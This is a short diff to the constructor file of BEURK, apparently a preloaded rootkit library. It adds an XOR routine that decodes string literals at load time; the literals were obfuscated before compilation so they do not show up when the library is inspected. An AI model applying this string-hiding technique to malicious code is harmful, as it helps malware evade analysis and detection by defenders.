@@ -18,10 +18,39 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
+#include <string.h>
 #include "beurk.h"
 
+/** xorify a string whith XOR_KEY
+ * (XOR_KEY is a macro defined in BEURK config file
+ */
+static void     xor(char *p) {
+    unsigned int i;
 
-void        init(void)
-{
+    for(i = 0; i < strlen(p); i++) {
+        p[i] ^= XOR_KEY;
+    }
+}
+
+/** re-xorify hidden literals.
+ * hidden literals are all string literals used in the library
+ * which are xorified before compilagtion in order to prevent
+ * string leaking.
+ *
+ * this function restores clear literals values, as defined in
+ * BEURK config file.
+ */
+static void     init_hidden_literals(void) {
+    int     i;
+
+    for (i=0; i<NUM_LITERALS; i++) {
+        xor(__hidden_literals[i]);
+    }
+}
+
+/** library constructor
+ */
+void            init(void) {
     DEBUG("init() constructor loaded");
+    init_hidden_literals();
 }
